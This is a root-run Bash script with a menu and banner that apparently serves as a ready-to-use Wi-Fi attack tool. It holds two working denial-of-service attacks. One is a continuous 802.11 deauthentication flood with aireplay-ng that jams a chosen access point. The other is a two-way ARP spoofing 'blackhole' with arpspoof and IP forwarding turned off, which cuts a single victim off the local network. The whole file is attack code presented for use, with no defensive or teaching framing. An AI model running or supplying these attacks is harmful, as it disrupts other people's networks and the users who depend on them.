#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[-] This script must be run as root."
  exit 1
fi


MON_IFACE=""
read -p "Enter your wireless interface (e.g. wlan0, wlan1): " INTERFACE

echo "Using interface: $INTERFACE"

show_menu() {
    clear
    cat << "MENU"
 ____        __           _      __      ___ _____ _    
|  _ \ __ _ / _| __ _ _  _ ___( )___  \ \     / (_)  ___(_)   
| |_) / _` | |_ / _` | | | / __|// __|  \ \ /\ / /| | |_  | |   
|  _ < (_| |  _| (_| | |_| \__ \  \__ \   \ V  V / | |  _| | |   
|_| \_\__,_|_|  \__,_|\__, |___/  |___/    \_/\_/  |_|_|  |_|   
                      |___/                                     
================================================================
1) Start Wi-Fi Jammer (Deauth)
2) Jam Single User (ARP Blackhole)
3) Exit
================================================================
MENU
}

cleanup() {
    echo -e "\n[*] Cleaning up and restoring network..."
    pkill -f aireplay-ng
    pkill -f arpspoof
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    if [ -n "$MON_IFACE" ]; then
        airmon-ng stop "$MON_IFACE" >/dev/null 2>&1
    fi
    systemctl restart NetworkManager
    echo "[✓] Cleanup complete."
    exit
}

trap cleanup SIGINT

while true; do
    show_menu
    read -p "Select an option [1-3]: " choice
    
    case $choice in
        1)
            echo "[*] Preparing environment..."
            nmcli device disconnect "$INTERFACE" 2>/dev/null
            airmon-ng check kill >/dev/null 2>&1
            
            echo "[*] Starting monitor mode..."
            airmon-ng start "$INTERFACE" >/dev/null 2>&1
            
            # Dynamically find the monitor interface created by airmon-ng
            MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | grep "mon")
            
            if [ -z "$MON_IFACE" ]; then
                echo "[!] Monitor interface creation failed."
                sleep 2; continue
            fi
            
            echo "[✓] Monitor interface: $MON_IFACE"
            echo "[*] Scanning... (Hit Ctrl+C to stop scanning)"
            airodump-ng "$MON_IFACE"
            
            read -p "Enter Target BSSID: " BSSID
            read -p "Enter Channel: " CH
            
            if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
                iwconfig "$MON_IFACE" channel "$CH"
                echo "[*] Jamming active on $BSSID..."
                aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE"
            else
                echo "[!] Invalid BSSID."
            fi
            ;;

        2)
            # Fetch default gateway dynamically
            GATEWAY=$(ip route | grep default | awk '{print $3}')
            echo "[*] Scanning for targets..."
            nmap -sn 192.168.1.0/24 | grep -E "Nmap scan report for|MAC Address:"
            read -p "[?] Enter Target IP: " TARGET_IP
            
            echo "[*] Engaging Blackhole for $TARGET_IP..."
            echo 0 > /proc/sys/net/ipv4/ip_forward
            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null >/dev/null &
            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null >/dev/null &
            
            echo "[!] Attack active. Press [CTRL+C] to stop."
            while true; do sleep 1; done
            ;;

        3)
            cleanup
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac
done
